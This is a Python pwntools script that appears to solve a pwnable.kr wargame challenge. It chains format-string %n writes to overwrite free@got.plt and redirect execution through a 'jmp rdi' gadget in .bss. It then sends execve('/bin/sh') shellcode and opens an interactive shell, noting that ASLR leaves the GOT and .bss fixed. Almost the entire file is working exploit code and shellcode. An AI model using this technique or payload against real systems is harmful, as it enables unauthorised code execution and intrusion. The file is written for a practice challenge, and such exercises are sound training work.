from pwn import *

FREE_GOT = 0x602000
JMP_RDI_ADDR = 0x6020a0
JMP_RDI = p32(0xe7ff)	# asm('jmp rdi', arch='amd64')
SHELLCODE = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'	# 23 bytes

t = remote('pwnable.kr', 9011)
def send_payload(num, p):
	t.sendlineafter('> ', num)
	t.sendlineafter('hello ', p)

p1 = '%{}c%9$n'.format(FREE_GOT)
p2 = '%{}c%18$n'.format(JMP_RDI_ADDR)

t.sendlineafter('? : ', JMP_RDI)	# Write `jmp to shellcode` at .bss section
send_payload('2', p1)			# Ready to change free@got.plt
send_payload('2', p2)			# Change free@got.plt to name address in .bss section
send_payload('3', SHELLCODE)		# Write `shellcode` in new heap section ( < 24 bytes )
t.interactive()

'''
PLT, GOT section / .bss section wasn't affected by ASLR.
'''
